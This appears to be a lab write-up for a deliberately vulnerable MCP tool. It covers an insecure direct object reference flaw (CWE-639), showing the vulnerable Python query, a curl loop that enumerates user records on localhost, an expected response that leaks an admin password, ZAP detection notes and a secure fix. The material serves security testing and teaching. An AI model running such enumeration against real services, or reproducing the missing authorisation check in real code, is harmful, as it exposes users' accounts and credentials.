# Insecure Direct Object Reference — CWE-639

## Description

The `get_user` tool fetches a user record by a numeric `user_id` supplied by the caller.
The SQL query is parameterised (no SQL injection), but there is no authorisation check —
any caller can retrieve any user's record, including the admin account and its password.

## Vulnerable Code

```python
# tools/idor.py
cur = db.execute(
    "SELECT id, name, email, role, password FROM users WHERE id = ?",
    (user_id,),
)
row = cur.fetchone()
return f"id={row[0]} name={row[1]} email={row[2]} role={row[3]} password={row[4]}"
```

The query is safe from SQLi, but all columns including `password` are returned without
checking whether the caller is authorised to access that specific user ID.

## Example MCP Call (own record)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "get_user",
    "arguments": {"user_id": 1}
  },
  "id": 1
}
```

## Attack: Enumerate All Users

Call sequentially with `user_id` = 1, 2, 3, 4, 5:

```bash
for i in 1 2 3 4 5; do
  curl -s http://localhost:8000/mcp \
    -H "Content-Type: application/json" \
    -H "Accept: application/json, text/event-stream" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"get_user\",\"arguments\":{\"user_id\":$i}},\"id\":$i}"
done
```

User ID 4 is the admin account (`role=admin, password=Sup3rS3cr3t!`).

## Expected Response (user_id=4)

```
id=4 name=admin email=admin@evmcp.local role=admin password=Sup3rS3cr3t!
```

## ZAP Detection

ZAP's IDOR / access control scanner should detect:
- Incrementing `user_id` returns different records with a `password` field present
- The response for `user_id=4` contains `role=admin` — indicating privilege escalation

## Secure Fix

Verify the caller's identity before returning a record:

```python
def get_user(user_id: int, caller_id: int) -> str:
    if caller_id != user_id and not is_admin(caller_id):
        return "Access denied"
    # ... fetch and return record
```

Also, avoid returning password hashes or credentials in API responses entirely.
